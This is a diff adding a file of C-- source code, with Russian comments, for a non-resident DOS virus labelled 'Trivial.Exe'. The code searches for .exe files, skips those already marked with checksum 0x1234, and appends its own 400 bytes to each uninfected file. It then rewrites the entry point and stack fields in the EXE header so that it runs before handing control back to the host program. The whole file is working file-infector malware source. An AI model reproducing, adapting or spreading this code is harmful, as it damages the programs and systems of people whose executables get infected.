@@ -1,0 +1,91 @@
+/* Вот вам и простой .exe неризидент...
+Name:	C--Exe
+Type:	Trivial.Exe
+Size:	400
+*/
+
+?resize	0
+?jumptomain	short
+?define	vlen	400
+
+?include	"stuff.h--"
+
+word	old[4] = {0,-16,-2,-16};	/* Старые IP/CS и SP/SS */
+byte	msk = "*.exe";			/* Маска */
+
+word	retaddr[2];
+word	oldss[2];
+
+struct	filerec	dta;			/* Disk Transfer Area */
+struct	exehdr	hdr;			/* Exe header */
+
+main()
+{
+	$push ES			/* Сохраним в стеке ES и DS */
+	$push DS
+	DS = CS;				/* DS = CS :) */
+	
+	retaddr[0] = old[0];			/* Старый IP */
+	retaddr[2] = ES + old[2] + 0x10;	/* CS */
+	oldss[0]   = old[4];
+	oldss[2]   = ES + old[6] + 0x10;	/* SS */
+	setDTA(CS,#dta);			/* Утановим DTA */
+	if (@FINDFIRSTFILE(,,0,#msk) == 0)	/* Ищем *.exe */
+	 do {
+	BX = FOPEN(2,,,#dta.fname);		/* Открываем */
+	if (BX != 0)				/* Открылся ? */
+	 {
+	  @FREAD(,BX,sizeof(hdr),#hdr);		/* Читаем header */
+	 if (hdr.chksum != 0x1234)		/* Заражен ? */
+	   {
+	    AX = hdr.pagecnt-1; DX = 0; CX = 512;
+	    $mul CX				/* Умножаем число в DX:AX */
+	    AX = AX + hdr.partp;		/* Расчитали размер .exe */
+	    SI = AX; DI = DX;			/* Сохраним.. */
+	    FSEEK(2,BX,0,0);			/* На конец файла */
+	   if ((SI==AX) && (DI==DX))		/* Оверлеев нет ? */
+		{
+		 AX = AX % 0x10;
+		 FWRITE(,BX,0x10-AX,0);		/* Заполним до 16 байт */
+		 old[0] = hdr.initip;		/* Переместим нужные значения */
+		 old[2] = hdr.initcs;
+		 old[4] = hdr.initsp;
+		 old[6] = hdr.initss;
+		 hdr.initip = 0x100;		/* Наш IP */
+		 hdr.chksum = 0x1234;		/* Пометим */
+		 FSEEK(2,BX,0,0);		/* На конец файла */
+		 DX = DX<<12-0x10;		/* Изза того что в C--
+						   немного туповатая арифметика
+						   приходится все делать по
+						   порядку */
+		 AX = AX>>4;
+		 DX = DX + AX - hdr.hdrsize;
+		 hdr.initcs = DX;		/* Новый SS и SP */
+		 hdr.initss = DX;
+
+		 hdr.initsp = 0x1000;		/* Установим SP */
+		 FWRITE(,BX,vlen,0x100);	/* Пишим себя */
+		 FSEEK(2,BX,0,0);		/* Опять в конец */
+		 DX = DX<<7;			/* Переведем блоки в страницы */
+		 hdr.pagecnt = DX;
+		 DX = 0; CX = 512;
+		 $div CX			/* Делим число в DX:AX */
+		 CX = AX;
+		 hdr.pagecnt = hdr.pagecnt + CX + 1;
+		 hdr.partp = DX;
+	         FSEEK(0,BX,0,0);		/* На начало */
+		 FWRITE(,BX,sizeof(hdr),#hdr);	/* Пишим новый header */
+		}
+	   }
+	  @FCLOSE(,BX);				/* Закрываем */
+	 }
+	} while (@FINDNEXTFILE() == 0);		/* Следующий .exe */
+	$pop DS					/* Восстановим ES/DS */
+	$pop ES
+	$CS:
+	SP = oldss[0];				/* Восстановим SS и SP */
+	$CS:
+	SS = oldss[2];
+	$CS:
+	$jmp far retaddr			/* На код носителя */
+}
